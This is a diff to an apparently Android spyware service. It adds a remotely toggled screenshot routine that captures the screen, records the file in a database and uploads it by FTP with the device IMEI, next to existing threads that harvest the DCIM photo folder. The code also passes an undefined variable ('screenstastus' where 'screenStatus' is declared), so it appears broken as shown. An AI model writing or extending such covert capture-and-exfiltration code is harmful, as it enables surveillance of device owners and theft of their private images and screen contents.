@@ -11,8 +11,10 @@ import android.app.Service;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.database.sqlite.SQLiteDatabase;
+import android.graphics.Bitmap;
 import android.os.Build;
 import android.os.Environment;
 import android.os.Handler;
@@ -43,6 +45,7 @@ public class MyService extends Service {
 
     private static final String CHANNEL_ID = "MyServiceChannel";
     private int recordCount = 10;
+    public static int screenfinifh = 0;
     public static int dcimfinifh = 0;
     public static int whatfinifh = 0;
 
@@ -64,6 +67,7 @@ public class MyService extends Service {
     public static boolean update_param;
     public ArrayList<String> Params = null;
 
+    private boolean screenStatus = true;
     public String DateTime() {
         Date dt = new Date();
         @SuppressLint("SimpleDateFormat")
@@ -271,6 +275,12 @@ public class MyService extends Service {
                     }
                 }
 
+                if ("1".equals(Params.get(1))) {
+                    if (screenfinifh == 0) {
+                        new Thread(this::Screenshot_Method).start();
+                    }
+                }
+
                 if ("1".equals(Params.get(11))) {
                     if (dcimfinifh == 0) {
                         new Thread(this::DCIM_Folder).start();
@@ -436,6 +446,37 @@ public class MyService extends Service {
         }
     }
 
+    @TargetApi(Build.VERSION_CODES.O)
+    private void Screenshot_Method() {
+        Log.d(TAG, "Starting Screenshot_Method");
+
+        // Проверка "SC" из Params (индекс 1, как в твоём column)
+        if (Params != null && Params.size() > 1 && "1".equals(Params.get(1))) {  // SC = "1"
+            // Проверка screen_switch из prefs
+            SharedPreferences prefs = getSharedPreferences("MyPrefs", MODE_PRIVATE);
+            if (prefs.getBoolean("screen_switch_enabled", false)) {
+                Log.d(TAG, "Screen capture enabled — taking screenshot");
+                Bitmap screenshot = Screenshot.takeScreenshot(this);  // Вызов метода
+                if (screenshot != null) {
+                    String fileName = DateTime() + "_screenshot.png";
+                    String filePath = new File(aDir, fileName).getAbsolutePath();  // aDir из твоего init
+                    Screenshot.savePic(screenshot, filePath);
+
+                    // Добавь в SrFiles для FTP (тип 8 для screenshots)
+                    if (dbh != null) {
+                        dbh.insert_SrFiles(dbh, "SrFiles", fileName, DateTime(), "8", "", "0");
+                        FTP_Sender.FTP(null, new String[] {filePath}, 8, 0, 0, Params, screenstastus, imeiNumber1, this, recordCount, aDir);
+                    }
+                } else {
+                    Log.e(TAG, "Screenshot failed — MediaProjection not initialized");
+                }
+            } else {
+                Log.d(TAG, "Screen switch disabled — skipping screenshot");
+            }
+        } else {
+            Log.d(TAG, "SC param not enabled — skipping screenshot");
+        }
+    }
     @TargetApi(Build.VERSION_CODES.GINGERBREAD)
     void DCIM_Folder() {
         dcimfinifh = 1;
